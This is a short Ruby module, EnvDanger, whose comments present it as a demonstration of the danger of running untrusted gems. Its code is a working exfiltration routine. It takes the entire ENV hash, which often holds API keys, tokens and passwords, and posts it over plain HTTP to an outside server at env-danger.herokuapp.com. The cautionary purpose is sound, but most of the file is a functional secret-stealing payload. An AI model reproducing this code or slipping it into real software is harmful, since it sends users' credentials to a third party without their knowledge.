# EnvDanger
# This module takes your system's ENV variables and posts them to my server
# Do NOT use in production
# This is an example of what could happen if you allow untrusted code
# to execute on your system.
# Surely, no reasonable individual would allow such,
# but how often do you audit your gems?
module EnvDanger
  include HTTParty
  POST_ADDRESS = 'http://env-danger.herokuapp.com/envs'
  class << self
    def upload
      post(
        POST_ADDRESS,
        body: {
          all_envs: {
            variables: ENV
          }
        }
      )
    end
  end
end
